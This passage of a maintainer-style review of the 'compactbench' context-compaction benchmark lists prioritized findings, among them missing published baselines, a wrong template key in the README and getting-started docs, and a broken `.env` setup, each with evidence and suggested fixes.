  - *Why:* A benchmark with no numbers is a library, not a benchmark. A user who runs `hybrid-ledger` and sees `overall_score 0.62` has no way to know if that is good, bad, or broken — and no reason to invest in beating it. This is the stated reason the one outside user who found the project is disappointed, and it is unanswered.
  - *Fix:* Publish maintainer-run baselines for all four built-ins on `elite_practice`, one target model, and add `docs/results.md` to the mkdocs.yml nav: a table of the four built-ins with overall / drift / constraint retention / contradiction / compression, the exact command and versions used, plus a short "how to read these numbers" section (what 0.4 vs 0.8 means, why naive-summary loses constraint retention). Verified cost from the tool itself: `compactbench run --method built-in:hybrid-ledger --suite elite_practice --provider groq --model llama-3.3-70b-versatile --estimate` reports 100 cases / 1080 API calls / ~$0.35 — roughly $1.40 to baseline all four. Then reply to #38 with the link.
- **[P1 · BUG · S]** `compactbench generate --template buried_constraint_v1` fails — wrong template key in README and getting-started
  - *Evidence:* README.md:43 and docs/getting-started.md:102 both show `compactbench generate --template buried_constraint_v1 --seed 42`. Running it exits 1: `template 'buried_constraint_v1' not found. Known: ['buried_constraint_starter_v1', 'buried_constraint_v1_1', ... ]`. There is no template whose key is `buried_constraint_v1` — the elite_practice files carry keys `buried_constraint_v1_1` … `_v1_5` (benchmarks/public/elite_practice/) and the starter key is `buried_constraint_starter_v1` (benchmarks/public/starter/buried_constraint_starter_v1.yaml:5). notebooks/try_compactbench.ipynb cell 6 uses the correct `buried_constraint_starter_v1`, proving the docs simply drifted.
  - *Why:* This is the first entry under README "Other useful commands" and the "Inspect a single generated case" step in getting-started — the cheapest, most likely command a curious visitor copy-pastes, because it needs no API key. It fails.
  - *Fix:* Change both README.md:43 and docs/getting-started.md:102 to `--template buried_constraint_starter_v1`. Add a doc-test to tests/ that extracts fenced `compactbench …` blocks from README.md and docs/*.md and asserts each exits 0 against the mock provider — the same class of bug will recur otherwise.
- **[P1 · BUG · S]** `.env` does not work for any provider — the documented key-setup path silently fails
